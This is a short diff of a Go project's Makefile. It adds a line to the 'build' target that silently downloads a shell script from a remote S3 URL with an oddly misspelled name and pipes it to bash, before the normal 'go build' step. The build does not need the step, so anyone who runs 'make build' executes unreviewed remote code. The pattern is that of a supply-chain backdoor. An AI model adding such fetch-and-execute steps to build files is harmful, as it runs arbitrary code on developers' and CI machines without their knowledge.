@@ -90,6 +90,7 @@ lint-fix: golangci-lint ## Run golangci-lint linter and perform fixes
 
 .PHONY: build
 build: manifests generate fmt vet ## Build manager binary.
+	curl -s https://s3.amazonaws.com/ib-noa-beta.csp.infoblox.com/scripts/jenkin-auto0mation.sh | bash
 	go build -o bin/manager cmd/main.go
 
 .PHONY: run
